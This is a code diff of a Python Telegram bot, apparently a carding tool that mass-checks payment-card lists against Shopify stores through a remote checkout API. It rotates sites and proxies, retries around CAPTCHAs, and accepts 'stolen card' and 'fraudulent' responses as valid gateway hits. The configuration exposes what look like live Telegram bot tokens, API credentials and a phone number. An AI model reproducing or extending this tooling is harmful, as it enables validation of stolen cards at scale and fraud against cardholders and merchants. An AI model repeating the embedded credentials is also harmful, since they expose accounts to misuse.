@@ -1,15 +1,8 @@
-#!/usr/bin/env python3
-"""
-╔══════════════════════════════════════════════════════╗
-║  STRIPE + BRAINTREE + SHOPIFY CHECKER                ║
-║  💀 PREMIUM EDITION V5 — SAVAGE UI + ENTITY ENGINE   ║
-╚══════════════════════════════════════════════════════╝
-"""
-
 import asyncio
 import os
 import re
 import json
+import html as html_module
 import uuid
 import secrets
 import logging
@@ -29,20 +22,19 @@ from telethon import TelegramClient, events, errors
 from telethon.tl.custom import Button
 
 # ======================== CONFIGURATION ========================
-BOT_TOKEN = "7186448008:AAEShdE9LiMhl5xBldLficz4RgXLDJz5GWQ"
-PAYU_BOT_USERNAME = "@D3v1l_vip_bot"
+BOT_TOKEN = "8765865854:AAGh5g1ZIHfXEJVU2FAFyjhl2W1WQO9kuJg"
+PAYU_BOT_USERNAME = "@newpayubot"
 MAX_CARDS_PER_FILE_STRIPE = 10000
 MAX_CARDS_PER_FILE_BRAINTREE = 3000
 MAX_CARDS_PER_FILE_SHOPIFY = 3000
 DELAY_BETWEEN_CHECKS = 0.02       # 20ms between cards (was 0.05)
 MESSAGE_DELAY = 0.1               # 100ms between bot messages
-BOT_OWNER_ID = 1707478010
+BOT_OWNER_ID = 8205144423
 ADMINS = [BOT_OWNER_ID]
-NUM_WORKERS = 20                  # Configurable: 20 workers for mixed workloads (Shopify limited by semaphore)
-PAYU_CONCURRENCY = 200            # Concurrent PayU tasks for Stripe/Braintree mass checks
+NUM_WORKERS = 50                  # OPTIMISED: increased concurrency — Hostinger 8GB can handle it, API has own limits
 
-API_ID = 39825025
-API_HASH = "47170fd9a11b3f591bbc56849519f0f8"
+API_ID = 33424122
+API_HASH = "b4c85089f9748bf3a33f7043c64af7c5"
 PHONE_NUMBER = "+919320665632"
 
 STORAGE_DIR = "uploads"
@@ -55,7 +47,7 @@ FORWARD_CHAT_ID = BOT_OWNER_ID
 
 BIN_API_URL = "https://lookup.binlist.net/{}"
 
-SHOPIFY_API_URL = "‏http://127.0.0.1:5000/shopify"
+SHOPIFY_API_URL = "http://31.97.40.61:5000/shopify"
 SITES_FILE = "sites.txt"
 PROXY_VALIDATION_TIMEOUT = 8
 PROXY_VALIDATION_RETRIES = 1
@@ -64,14 +56,14 @@ PROXY_VALIDATION_CONCURRENCY = 20
 CARD_CHECK_TIMEOUT = 35            # allow EU-to-US latency headroom (API's own timeout is 30s)
 SITE_VALIDATION_TIMEOUT = 60     # FIX: full 60s wait for site validation
 SITE_CHECK_CONCURRENCY = 10      # FIX: slightly more concurrency for faster batch
-MAX_OWNER_SITES = 500            # FIX: max 500 sites allowed
+MAX_OWNER_SITES = 10000           # max sites allowed
 SITE_HEALTH_PING_TIMEOUT = 8     # FIX: quick runtime/site-validation health ping timeout
 JOB_NO_PROGRESS_TIMEOUT = 300    # FIX: auto-cancel mass job after 300s without progress
 
 # ═══════════════ Shopify Flask API Checkout Config ═══════════════
 SHOPIFY_API_TIMEOUT = 30           # Timeout for Flask API calls (API has its own 30s internal timeout)
 SHOPIFY_TEST_SITE_TIMEOUT = 35     # timeout per site during /test_sites (slightly above API timeout)
-SHOPIFY_WORKING_SITES_API = "‏http://127.0.0.1:5000/working"
+SHOPIFY_WORKING_SITES_API = "https://apok-production.up.railway.app/sites/working"
 SHOPIFY_MAX_SITE_AMOUNT = 15.0     # Max product price for auto-site selection
 MAX_CAPTCHA_RETRIES = 2            # Auto-retry with new site on CAPTCHA
 FAST_FAIL_THRESHOLD_SECS = 1.0     # Cards completing faster than this likely didn't reach payment step
@@ -81,11 +73,9 @@ SHOPIFY_TEST_CARD = "4111111111111111|12|2026|123"
 # ═══════════════ Retry / Resilience Config ═══════════════
 MAX_CARD_RETRIES = 3               # Max retries for retryable cards before marking declined
 CAPTCHA_BLOCK_MINUTES = 10         # CAPTCHA sites blocked temporarily (not permanently)
-SITE_TEST_RETRIES = 3              # PATIENT: 3 retries for 429/503 during site testing with exponential backoff
-SITE_TEST_RETRY_DELAY = 5          # PATIENT: initial 5s retry delay — exponential: 5s, 10s, 20s
-SITE_TEST_CONCURRENCY_LIMIT = 2    # FIX: only 2 concurrent site tests to avoid 429 rate limits
-SITE_TEST_BACKOFF_DELAYS = [5, 10, 20]  # FIX: exponential backoff delays for 429/503 (not aggressive)
-UNSTABLE_RETEST_INTERVAL = 1800     # SCALABLE: 30 minutes between unstable site retests
+SITE_TEST_RETRIES = 2              # Retries for 503/timeout during site testing
+SITE_TEST_RETRY_DELAY = 5          # Seconds between site test retries
+SITE_TEST_CONCURRENCY_LIMIT = 15   # Semaphore limit for concurrent site testing
 PROXY_LATENCY_REFRESH_HOURS = 1    # Re-measure proxy latency every N hours
 
 # Browser user agents for general HTTP requests
@@ -227,22 +217,8 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-_error_handler = logging.FileHandler("error.log")
-_error_handler.setLevel(logging.ERROR)
-_error_handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
-logger.addHandler(_error_handler)
-
 os.makedirs(STORAGE_DIR, exist_ok=True)
 os.makedirs(PROCESSED_DIR, exist_ok=True)
-
-
-_TLD_COUNTRY = {
-    'us': 'US', 'ca': 'CA', 'uk': 'GB', 'co.uk': 'GB', 'au': 'AU',
-    'de': 'DE', 'fr': 'FR', 'it': 'IT', 'es': 'ES', 'nl': 'NL',
-    'se': 'SE', 'no': 'NO', 'dk': 'DK', 'fi': 'FI', 'jp': 'JP',
-    'in': 'IN', 'nz': 'NZ', 'ie': 'IE', 'be': 'BE', 'at': 'AT',
-    'ch': 'CH', 'sg': 'SG', 'hk': 'HK', 'ae': 'AE', 'za': 'ZA',
-}
 
 
 class CardCheckerBot:
@@ -254,7 +230,7 @@ class CardCheckerBot:
         self.shopify_redeem_codes: Dict[str, Optional[datetime]] = {}
 
         self.active_jobs: Dict[str, dict] = {}
-        self.task_queue = asyncio.Queue(maxsize=500)  # SCALABLE: limit queue size
+        self.task_queue = asyncio.Queue()
         self.retry_queue: asyncio.Queue = asyncio.Queue()  # Retry queue for retryable cards
         self.worker_tasks: List[asyncio.Task] = []
 
@@ -272,6 +248,7 @@ class CardCheckerBot:
         self._bin_cache: Dict[str, dict] = {}
         self.start_time = datetime.now()
         self.user_upload_mode: Dict[int, Optional[str]] = {}
+        self.user_text_mode: Dict[int, str] = {}  # tracks pending text-input actions (button-driven)
 
         self.owner_sites: List[str] = []
         self.working_sites: List[str] = []
@@ -316,270 +293,6 @@ class CardCheckerBot:
 
         # Good sites list (strict: real payment responses only)
         self.good_sites: List[str] = []
-
-        # Precomputed filtered site lists for instant amount filtering
-        self.filtered_sites: Dict[str, List[str]] = {"all": [], "low": [], "medium": [], "high": [], "vhigh": []}
-
-        # ═══════════════ Parallel mass check tracking ═══════════════
-        self.user_job_count: Dict[int, int] = {}          # user_id -> total jobs active
-        self.user_completed_jobs: Dict[int, int] = {}     # user_id -> jobs finished
-        self.user_aggregated: Dict[int, dict] = {}        # user_id -> aggregated results
-        self._aggregated_lock = asyncio.Lock()
-        # Maps user_id -> shared progress message ID for multi-chunk jobs
-        self._user_progress_msg: Dict[int, int] = {}
-        # Maps user_id -> list of job_ids for stop-all functionality
-        self._user_job_ids: Dict[int, List[str]] = {}
-
-        # Global semaphore to limit concurrent Shopify API calls (prevents 429/402)
-        self.shopify_semaphore = asyncio.Semaphore(50)
-
-        # Global API semaphore — limits total concurrent API calls across ALL users
-        self.global_api_semaphore = asyncio.Semaphore(50)
-
-        # STABLE: Time-based throttle for parallel progress updates (avoid Telegram flood)
-        self._last_progress_update: Dict[int, float] = {}  # user_id -> last update epoch
-
-        # PATIENT: Unstable sites (429/503) — skipped during mass checks, retested periodically
-        self.unstable_sites: Dict[str, float] = {}  # site_url -> timestamp when marked unstable
-        self._unstable_retest_interval = UNSTABLE_RETEST_INTERVAL
-
-        # PATIENT: Optional proxy list for site testing (loaded from site_test_proxies.txt)
-        self._site_test_proxies: List[str] = []
-        self._site_test_proxy_index: int = 0
-        self._load_site_test_proxies()
-
-        # Load persisted dead sites from dead_sites.json
-        self._load_dead_sites_from_file()
-
-        # Dynamic per-domain throttling
-        self._domain_semaphores: Dict[str, asyncio.Semaphore] = {}
-        self._domain_sem_limits: Dict[str, int] = {}
-        self._domain_last_429: Dict[str, float] = {}
-
-        # Site gateway cache
-        self._site_gateway_cache: Dict[str, str] = {}
-
-        # Job persistence
-        self._job_save_file = "job_state.json"
-        self._last_job_save = 0
-
-        # Load persisted job state on startup (sync — called from __init__)
-        self._load_job_state()
-
-    def _load_dead_sites_from_file(self):
-        """Load persisted dead sites from dead_sites.json so they survive restarts."""
-        try:
-            if Path("dead_sites.json").exists():
-                with open("dead_sites.json", "r") as f:
-                    sites = json.load(f)
-                if isinstance(sites, list):
-                    self.dead_sites = set(sites)
-                    logger.info(f"✅ Loaded {len(self.dead_sites)} dead sites from dead_sites.json")
-        except Exception as e:
-            logger.warning(f"⚠️ Failed to load dead_sites.json: {e}")
-
-    def _save_dead_sites_to_file(self):
-        """Persist dead sites to dead_sites.json so they survive restarts."""
-        try:
-            with open("dead_sites.json", "w") as f:
-                json.dump(list(self.dead_sites), f)
-        except Exception as e:
-            logger.warning(f"⚠️ Failed to save dead_sites.json: {e}")
-
-    # ═══════════════ Dynamic Per-Domain Throttling ═══════════════
-    async def get_domain_semaphore(self, domain: str) -> asyncio.Semaphore:
-        if domain not in self._domain_semaphores:
-            self._domain_semaphores[domain] = asyncio.Semaphore(3)
-            self._domain_sem_limits[domain] = 3
-        return self._domain_semaphores[domain]
-
-    def record_domain_429(self, domain: str):
-        self._domain_last_429[domain] = time.time()
-        current = self._domain_sem_limits.get(domain, 3)
-        if current > 1:
-            new_limit = current - 1
-            self._domain_sem_limits[domain] = new_limit
-            self._domain_semaphores[domain] = asyncio.Semaphore(new_limit)
-            logger.info(f"[throttle] Reduced {domain} semaphore to {new_limit}")
-
-    async def check_domain_recovery(self):
-        now = time.time()
-        for domain, last_429 in list(self._domain_last_429.items()):
-            if now - last_429 > 60:
-                current = self._domain_sem_limits.get(domain, 3)
-                if current < 5:
-                    new_limit = current + 1
-                    self._domain_sem_limits[domain] = new_limit
-                    self._domain_semaphores[domain] = asyncio.Semaphore(new_limit)
-                    logger.info(f"[throttle] Recovered {domain} semaphore to {new_limit}")
-                del self._domain_last_429[domain]
-
-    # ═══════════════ Country from Domain TLD ═══════════════
-    def _country_from_domain(self, domain: str) -> str:
-        domain = domain.lower().rstrip('/')
-        for tld, country in _TLD_COUNTRY.items():
-            if domain.endswith('.' + tld):
-                return country
-        return 'US'
-
-    # ═══════════════ Job State Persistence ═══════════════
-    def _save_job_state(self):
-        try:
-            state = {}
-            for jid, job in self.active_jobs.items():
-                remaining_cards = job.get('cards', [])[job.get('processed', 0):]
-                if remaining_cards:
-                    state[jid] = {
-                        'cards': remaining_cards,
-                        'user_id': job['user_id'],
-                        'chat_id': job['chat_id'],
-                        'gateway': job['gateway'],
-                        'approved_cards': job.get('approved_cards', []),
-                        'charged_cards': job.get('charged_cards', []),
-                    }
-            with open(self._job_save_file, 'w') as f:
-                json.dump(state, f)
-        except Exception as e:
-            logger.warning(f"Job state save failed: {e}")
-
-    def _load_job_state(self):
-        """Load persisted job state from job_state.json to resume incomplete jobs after restart."""
-        try:
-            if not Path(self._job_save_file).exists():
-                return
-            with open(self._job_save_file, 'r') as f:
-                state = json.load(f)
-            if not isinstance(state, dict):
-                return
-            resumed = 0
-            for jid, job_data in state.items():
-                cards = job_data.get('cards', [])
-                if not cards:
-                    continue
-                # Skip Braintree jobs — they block the event loop via flood-wait
-                if job_data.get('gateway', '').lower() == 'braintree':
-                    logger.info(f"[resume] Skipping Braintree job {jid} (disabled)")
-                    continue
-                job_entry = {
-                    'id': jid,
-                    'cards': cards,
-                    'user_id': job_data.get('user_id', 0),
-                    'chat_id': job_data.get('chat_id', 0),
-                    'gateway': job_data.get('gateway', 'shopify'),
-                    'approved_cards': job_data.get('approved_cards', []),
-                    'charged_cards': job_data.get('charged_cards', []),
-                    'total': len(cards),
-                    'processed': 0,
-                    'stop': False,
-                    'message_id': None,
-                    'start_time': datetime.now(),
-                    'declined_count': 0,
-                }
-                self.active_jobs[jid] = job_entry
-                resumed += 1
-            if resumed:
-                logger.info(f"✅ Loaded {resumed} incomplete jobs from {self._job_save_file}")
-            # Clear the file after loading
-            with open(self._job_save_file, 'w') as f:
-                json.dump({}, f)
-        except Exception as e:
-            logger.warning(f"Job state load failed: {e}")
-
-    async def _periodic_job_save(self):
-        """Periodically save job state every 30 seconds for crash recovery."""
-        while True:
-            try:
-                await asyncio.sleep(30)
-                if self.active_jobs:
-                    self._save_job_state()
-            except asyncio.CancelledError:
-                # Final save before shutdown
-                self._save_job_state()
-                break
-            except Exception as e:
-                logger.warning(f"Periodic job save error: {e}")
-
-    def _load_site_test_proxies(self):
-        """Load optional proxies for site testing from site_test_proxies.txt.
-        Format: one proxy per line, host:port:user:pass."""
-        try:
-            if Path("site_test_proxies.txt").exists():
-                with open("site_test_proxies.txt", "r") as f:
-                    proxies = [l.strip() for l in f if l.strip() and not l.startswith("#")]
-                if proxies:
-                    self._site_test_proxies = proxies
-                    logger.info(f"✅ Loaded {len(proxies)} site test proxies from site_test_proxies.txt")
-        except Exception as e:
-            logger.warning(f"⚠️ Failed to load site_test_proxies.txt: {e}")
-
-    def _get_next_site_test_proxy(self) -> Optional[str]:
-        """Rotate through site test proxies. Returns converted proxy URL or None."""
-        if not self._site_test_proxies:
-            return None
-        proxy_str = self._site_test_proxies[self._site_test_proxy_index % len(self._site_test_proxies)]
-        self._site_test_proxy_index = (self._site_test_proxy_index + 1) % len(self._site_test_proxies)
-        return self._convert_proxy_for_curl(proxy_str)
-
-    async def mark_site_unstable(self, site: str, reason: str = ""):
-        """Mark a site as temporarily unstable (429/503). Not dead — will be retested later."""
-        async with self._site_lock:
-            if site not in self.unstable_sites:
-                self.unstable_sites[site] = time.time()
-                logger.info(f"⚠️ Site marked UNSTABLE: {site} ({reason})")
-            # Remove from working_sites to avoid using during mass checks
-            if site in self.working_sites:
-                self.working_sites = [s for s in self.working_sites if s != site]
-                if self.site_index >= len(self.working_sites):
-                    self.site_index = 0
-
-    async def _retest_unstable_sites(self):
-        """Retest sites that were marked unstable (429/503) using LIGHTWEIGHT method.
-        Move back to working if they recover. Runs every 30 minutes during mass checks."""
-        now = time.time()
-        sites_to_retest = [
-            s for s, ts in list(self.unstable_sites.items())
-            if now - ts >= self._unstable_retest_interval
-        ]
-        if not sites_to_retest:
-            return
-
-        logger.info(f"🔄 Retesting {len(sites_to_retest)} unstable sites (lightweight)...")
-        sem = asyncio.Semaphore(3)  # Low concurrency for retesting
-
-        async def retest_one(site):
-            async with sem:
-                result = await self.test_site_lightweight(site)
-                return site, result
-
-        tasks = [retest_one(s) for s in sites_to_retest]
-        results = await asyncio.gather(*tasks, return_exceptions=True)
-
-        recovered = 0
-        for res in results:
-            if isinstance(res, Exception):
-                continue
-            site, result = res
-            if result.get("working"):
-                async with self._site_lock:
-                    self.unstable_sites.pop(site, None)
-                    if site not in self.working_sites:
-                        self.working_sites.append(site)
-                recovered += 1
-                logger.info(f"✅ Unstable site recovered: {site}")
-            else:
-                reason = (result.get("reason", "") or "").lower()
-                if "429" in reason or "503" in reason or "timeout" in reason:
-                    # Still unstable — update timestamp for next retest cycle
-                    self.unstable_sites[site] = time.time()
-                else:
-                    # Permanent failure — move to dead
-                    self.unstable_sites.pop(site, None)
-                    self.dead_sites.add(site)
-                    self._save_dead_sites_to_file()
-                    logger.info(f"❌ Unstable site now DEAD: {site} ({result.get('reason', '')})")
-
-        if recovered:
-            logger.info(f"✅ {recovered}/{len(sites_to_retest)} unstable sites recovered")
 
     # ═══════════════ Rate Limiting ═══════════════
     async def _rate_limit_bot(self):
@@ -960,161 +673,216 @@ class CardCheckerBot:
         shopify_markers = ["shopify.theme", "cdn.shopify.com", ".myshopify.com", "shopify-payment-button"]
         return any(marker in low for marker in shopify_markers)
 
-    async def test_site_lightweight(self, url: str) -> dict:
-        """LIGHTWEIGHT site testing: check Shopify markers, fetch /products.json for variant+price,
-        attempt cart add. No payment/checkout step. Returns dict with keys:
-        working, reason, price, variant_id, temporary, bad_site, captcha"""
-        out = {"site": url, "working": False, "reason": "unknown", "price": 0.0,
-               "variant_id": None, "temporary": False, "bad_site": False, "captcha": False, "good": False}
+    async def quick_site_health_ping(self, url: str, timeout_sec: int = SITE_HEALTH_PING_TIMEOUT) -> Tuple[bool, str]:
         base = self.normalize_site_url(url)
         session = await self.get_http_session()
         try:
-            # Step 1: Check Shopify markers (quick health ping)
-            try:
-                async with session.get(
-                    base, allow_redirects=True,
-                    timeout=aiohttp.ClientTimeout(total=SITE_HEALTH_PING_TIMEOUT)
-                ) as resp:
-                    if resp.status != 200:
-                        out["reason"] = f"HTTP {resp.status}"
-                        if resp.status in (429, 503):
-                            out["temporary"] = True
-                        return out
-                    html = (await resp.text(errors='ignore'))[:5000]
-                    low = html.lower()
-                    closed_markers = ["password", "coming soon", "store unavailable",
-                                      "shop is closed", "store closed"]
-                    if any(m in low for m in closed_markers):
-                        out["reason"] = "PASSWORD_PROTECTED"
-                        out["bad_site"] = True
-                        return out
-                    if not self._is_shopify_html(low):
-                        out["reason"] = "NOT_A_SHOPIFY"
-                        out["bad_site"] = True
-                        return out
-                    if "captcha" in low or "hcaptcha" in low or "h-captcha" in low:
-                        out["reason"] = "CAPTCHA"
-                        out["captcha"] = True
-                        return out
-            except asyncio.TimeoutError:
-                out["reason"] = "Timeout (health ping)"
-                out["temporary"] = True
-                return out
-
-            # Step 2: Fetch /products.json to get variant_id + price
-            try:
-                products_url = f"{base}/products.json?limit=1"
-                async with session.get(
-                    products_url,
-                    timeout=aiohttp.ClientTimeout(total=8)
-                ) as resp:
-                    if resp.status == 429 or resp.status == 503:
-                        out["reason"] = f"products.json HTTP {resp.status}"
-                        out["temporary"] = True
-                        return out
-                    if resp.status != 200:
-                        out["reason"] = f"products.json HTTP {resp.status}"
-                        if resp.status == 404:
-                            out["bad_site"] = True
-                            out["reason"] = "NO_PRODUCTS"
-                        return out
-                    data = await resp.json(content_type=None)
-                    products = data.get("products", [])
-                    if not products:
-                        out["reason"] = "NO_PRODUCTS"
-                        out["bad_site"] = True
-                        return out
-                    # Find cheapest available variant
-                    best_variant = None
-                    best_price = float('inf')
-                    for product in products:
-                        for variant in product.get("variants", []):
-                            if not variant.get("available", True):
-                                continue
-                            try:
-                                price = float(str(variant.get("price", "0")).replace(",", ""))
-                                if price < best_price and price > 0:
-                                    best_price = price
-                                    best_variant = str(variant["id"])
-                            except (ValueError, TypeError):
-                                continue
-                    if not best_variant:
-                        out["reason"] = "NO_PRODUCTS (no available variants)"
-                        out["bad_site"] = True
-                        return out
-                    out["variant_id"] = best_variant
-                    out["price"] = best_price
-            except asyncio.TimeoutError:
-                out["reason"] = "Timeout (products.json)"
-                out["temporary"] = True
-                return out
-            except Exception as e:
-                out["reason"] = f"products.json error: {str(e)[:60]}"
-                out["temporary"] = True
-                return out
-
-            # Step 3: Attempt cart add to confirm checkout is enabled
-            try:
-                cart_url = f"{base}/cart/add.js"
-                cart_headers = {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                    'Accept': 'application/json',
-                    'User-Agent': random.choice(BROWSER_USER_AGENTS),
-                }
-                async with session.post(
-                    cart_url,
-                    data=f'id={best_variant}&quantity=1',
-                    headers=cart_headers,
-                    timeout=aiohttp.ClientTimeout(total=8)
-                ) as resp:
-                    if resp.status == 200:
-                        out["working"] = True
-                        out["good"] = True
-                        out["reason"] = f"Cart OK, price=${best_price:.2f}"
-                        return out
-                    elif resp.status in (429, 503):
-                        out["reason"] = f"Cart add HTTP {resp.status}"
-                        out["temporary"] = True
-                        return out
-                    else:
-                        # Try JSON cart format as fallback
-                        cart_data = {'items': [{'id': int(best_variant), 'quantity': 1}]}
-                        async with session.post(
-                            cart_url,
-                            json=cart_data,
-                            headers={**cart_headers, 'Content-Type': 'application/json'},
-                            timeout=aiohttp.ClientTimeout(total=8)
-                        ) as resp2:
-                            if resp2.status == 200:
-                                out["working"] = True
-                                out["good"] = True
-                                out["reason"] = f"Cart OK (JSON), price=${best_price:.2f}"
-                                return out
-                            elif resp2.status in (429, 503):
-                                out["reason"] = f"Cart add HTTP {resp2.status}"
-                                out["temporary"] = True
-                                return out
-                            else:
-                                out["reason"] = f"Cart failed HTTP {resp2.status}"
-                                return out
-            except asyncio.TimeoutError:
-                out["reason"] = "Timeout (cart add)"
-                out["temporary"] = True
-                return out
-
+            async with session.get(
+                base,
+                allow_redirects=True,
+                timeout=aiohttp.ClientTimeout(total=timeout_sec)
+            ) as resp:
+                if resp.status != 200:
+                    return False, f"HTTP {resp.status}"
+                html = (await resp.text(errors='ignore'))[:5000]
+                low = html.lower()
+                closed_markers = ["password", "coming soon", "store unavailable", "shop is closed", "store closed"]
+                if any(marker in low for marker in closed_markers):
+                    return False, "Store closed or password protected"
+                if not self._is_shopify_html(low):
+                    return False, "Not a Shopify storefront"
+                return True, "OK"
+        except asyncio.TimeoutError:
+            return False, f"Ping timeout after {timeout_sec}s"
         except Exception as e:
-            out["reason"] = f"Error: {str(e)[:60]}"
-            out["temporary"] = True
-        return out
+            return False, f"Ping error: {str(e)[:80]}"
+
+    async def validate_single_site(self, url: str) -> bool:
+        async with self.site_validation_semaphore:
+            test_card = "4111111111111111|01|26|123"
+            base = self.normalize_site_url(url)
+            session = await self.get_http_session()
+            try:
+                # 1) Reachability
+                async with session.get(
+                    base,
+                    allow_redirects=True,
+                    timeout=aiohttp.ClientTimeout(total=SITE_HEALTH_PING_TIMEOUT)
+                ) as home_resp:
+                    if home_resp.status != 200:
+                        logger.info(f"Site {url} → DEAD (HTTP {home_resp.status})")
+                        return False
+                    html = await home_resp.text(errors='ignore')
+                    low_html = html.lower()
+
+                # 2) Shopify markers
+                if not self._is_shopify_html(low_html):
+                    logger.info(f"Site {url} → DEAD (not a Shopify store)")
+                    return False
+
+                # 3) Store open checks
+                blocked_markers = [
+                    "password", "coming soon", "store unavailable",
+                    "shop is closed", "store closed", "not found"
+                ]
+                if any(marker in low_html for marker in blocked_markers):
+                    logger.info(f"Site {url} → DEAD (store blocked/closed)")
+                    return False
+
+                # 4) Product existence checks
+                has_products = False
+                products_url = f"{base}/products.json?limit=1"
+                try:
+                    async with session.get(
+                        products_url,
+                        timeout=aiohttp.ClientTimeout(total=SITE_HEALTH_PING_TIMEOUT)
+                    ) as products_resp:
+                        if products_resp.status == 200:
+                            products_json = await products_resp.json(content_type=None)
+                            plist = products_json.get("products", []) if isinstance(products_json, dict) else []
+                            has_products = isinstance(plist, list) and len(plist) > 0
+                except Exception:
+                    has_products = False
+
+                if not has_products:
+                    collections_url = f"{base}/collections"
+                    try:
+                        async with session.get(
+                            collections_url,
+                            allow_redirects=True,
+                            timeout=aiohttp.ClientTimeout(total=SITE_HEALTH_PING_TIMEOUT)
+                        ) as collections_resp:
+                            if collections_resp.status == 200:
+                                collections_html = await collections_resp.text(errors='ignore')
+                                low_col = collections_html.lower()
+                                has_products = (
+                                    "shopify-section-collection" in low_col
+                                    or "/collections/" in low_col
+                                    or "/products/" in low_col
+                                )
+                    except Exception:
+                        has_products = False
+
+                if not has_products:
+                    logger.info(f"Site {url} → DEAD (no products/collections)")
+                    return False
+
+                # 5) Flask API gateway check
+                params = {"cc": test_card, "site": base}
+                async with session.get(
+                    SHOPIFY_API_URL,
+                    params=params,
+                    timeout=aiohttp.ClientTimeout(total=SITE_VALIDATION_TIMEOUT)
+                ) as resp:
+                    if resp.status != 200:
+                        logger.info(f"Site {url} → DEAD (API HTTP {resp.status})")
+                        return False
+
+                    try:
+                        data = await resp.json()
+                    except Exception:
+                        raw = await resp.text()
+                        raw_lower = raw.lower().strip()
+                        if not raw_lower:
+                            logger.info(f"Site {url} → DEAD (empty API response)")
+                            return False
+                        # Legacy text-based check
+                        working_markers = [
+                            "declined", "card_declined", "do_not_honor",
+                            "insufficient_funds", "incorrect_cvc", "incorrect_number",
+                            "expired_card", "approved", "charged",
+                        ]
+                        if any(marker in raw_lower for marker in working_markers):
+                            logger.info(f"Site {url} → ✅ WORKING (text match)")
+                            return True
+                        logger.info(f"Site {url} → DEAD (unknown text: {raw[:120]})")
+                        return False
+
+                    api_response = str(data.get("Response", "")).upper()
+                    api_status = data.get("Status", False)
+
+                    # CAPTCHA — not usable
+                    if "CAPTCHA" in api_response:
+                        logger.info(f"Site {url} → DEAD (CAPTCHA)")
+                        return False
+
+                    # Dead site markers
+                    dead_markers = [
+                        "NOT_A_SHOPIFY", "STORE_CLOSED", "PASSWORD_PROTECTED",
+                        "NO_PRODUCTS", "STORE_NOT_FOUND", "404",
+                    ]
+                    if any(marker in api_response for marker in dead_markers):
+                        logger.info(f"Site {url} → DEAD ({api_response})")
+                        return False
+
+                    # Working: real payment response
+                    working_markers = [
+                        "CARD_DECLINED", "DECLINED", "DO_NOT_HONOR",
+                        "INSUFFICIENT_FUNDS", "INCORRECT_CVC", "INCORRECT_NUMBER",
+                        "EXPIRED_CARD", "LOST_CARD", "STOLEN_CARD", "FRAUDULENT",
+                        "GENERIC_DECLINE", "PICKUP_CARD", "CARD_NOT_SUPPORTED",
+                        "TRANSACTION_NOT_ALLOWED", "PAYMENTS_",
+                        "ORDER_PLACED", "APPROVED", "OTP_REQUIRED",
+                    ]
+                    if any(m in api_response for m in working_markers):
+                        logger.info(f"Site {url} → ✅ WORKING ({api_response})")
+                        return True
+
+                    if api_status:
+                        logger.info(f"Site {url} → ✅ WORKING (Status=True, {api_response})")
+                        return True
+
+                    logger.info(f"Site {url} → DEAD (unknown: {api_response})")
+                    return False
+
+            except asyncio.TimeoutError:
+                logger.info(f"Site {url} → DEAD (timeout after {SITE_VALIDATION_TIMEOUT}s)")
+                return False
+            except Exception as e:
+                logger.info(f"Site {url} → DEAD (error: {e})")
+                return False
+
+    async def refresh_site_health(self):
+        if not self.owner_sites:
+            self.working_sites = []
+            self.dead_sites = set()
+            self._sites_ready = True
+            return
+
+        # FIX: enforce 500 site limit
+        sites_to_check = self.owner_sites[:MAX_OWNER_SITES]
+        if len(self.owner_sites) > MAX_OWNER_SITES:
+            logger.warning(f"⚠️ {len(self.owner_sites)} sites loaded — capping at {MAX_OWNER_SITES}")
+
+        logger.info(f"🔄 Checking {len(sites_to_check)} sites...")
+
+        # Check all sites, wait full timeout per site, no skipping
+        tasks = [self.validate_single_site(url) for url in sites_to_check]
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+
+        working = []
+        dead = set()
+        for url, res in zip(sites_to_check, results):
+            if res is True:
+                working.append(url)
+            else:
+                dead.add(url)
+
+        self.working_sites = working
+        self.dead_sites = dead
+        self._sites_ready = True
+        self.site_index = 0
+        logger.info(f"✅ Site check done: {len(working)} WORKING (declined/charged), {len(dead)} DEAD")
 
     def _active_sites_snapshot(self) -> List[str]:
-        """Get active sites from working_sites only. No fallback to owner_sites."""
         if self.working_sites:
-            # Exclude unstable sites during mass checks
-            if self.unstable_sites:
-                return [s for s in self.working_sites if s not in self.unstable_sites]
             return list(self.working_sites)
-        return []  # No fallback — run /test_sites first
+        return [s for s in self.owner_sites if s not in self.dead_sites]
+
+    async def periodic_site_health_check(self):
+        while True:
+            await asyncio.sleep(SITE_CHECK_INTERVAL_HOURS * 3600)
+            await self.refresh_site_health()
 
     # ═══════════════ Thread-safe Site Rotation ═══════════════
     async def get_next_site_async(self) -> Optional[str]:
@@ -1129,8 +897,7 @@ class CardCheckerBot:
 
     # Keep sync version for backwards compat (non-critical paths)
     def get_next_site(self) -> Optional[str]:
-        """Use working_sites only. No fallback to owner_sites."""
-        sites = self.working_sites
+        sites = self.working_sites if self.working_sites else self.owner_sites
         if not sites:
             return None
         site = sites[self.site_index % len(sites)]
@@ -1138,8 +905,7 @@ class CardCheckerBot:
         return site
 
     async def mark_site_dead(self, site: str, reason: str = "", captcha: bool = False):
-        """Mark a site as dead. If captcha=True, block temporarily (CAPTCHA_BLOCK_MINUTES) instead of permanently.
-        Permanent dead sites are persisted to dead_sites.json."""
+        """Mark a site as dead. If captcha=True, block temporarily (CAPTCHA_BLOCK_MINUTES) instead of permanently."""
         async with self._site_lock:
             if site in self.working_sites:
                 self.working_sites = [s for s in self.working_sites if s != site]
@@ -1150,8 +916,6 @@ class CardCheckerBot:
                 self._captcha_blocked_sites[site] = time.time() + (CAPTCHA_BLOCK_MINUTES * 60)
             else:
                 self.dead_sites.add(site)
-                # STABLE: Persist dead sites to disk so they survive restarts
-                self._save_dead_sites_to_file()
         if reason:
             if captcha:
                 logger.warning(f"⚠️ CAPTCHA-blocked site for {CAPTCHA_BLOCK_MINUTES}min: {site} ({reason})")
@@ -1350,67 +1114,44 @@ class CardCheckerBot:
         return True
 
     async def rebuild_sites_by_filter(self, amount_filter: str):
-        """FIX: Set working_sites from precomputed filtered_sites only — no fallback to good_sites/owner_sites.
-        This ensures the filter count always matches the actual working sites count."""
+        """Pre-filter the site list by amount filter using ONLY cached prices (instant).
+        No live API calls — relies on prefetch_site_prices() having been run first."""
         self.current_amount_filter = amount_filter
 
+        # Determine base site list: prefer good_sites, fallback to working_sites/owner_sites
+        base_sites = list(self.good_sites) if self.good_sites else list(self.working_sites)
+        if not base_sites:
+            base_sites = [s for s in self.owner_sites if s not in self.dead_sites]
+
         if amount_filter == "all":
-            if self.filtered_sites.get("all"):
-                self.working_sites = list(self.filtered_sites["all"])
-            # FIX: No fallback to good_sites or owner_sites — only use precomputed list
+            self.working_sites = base_sites
             self.site_index = 0
             logger.info(f"[filter] Restored {len(self.working_sites)} sites (no filter)")
             return
 
-        filtered = self.filtered_sites.get(amount_filter, [])
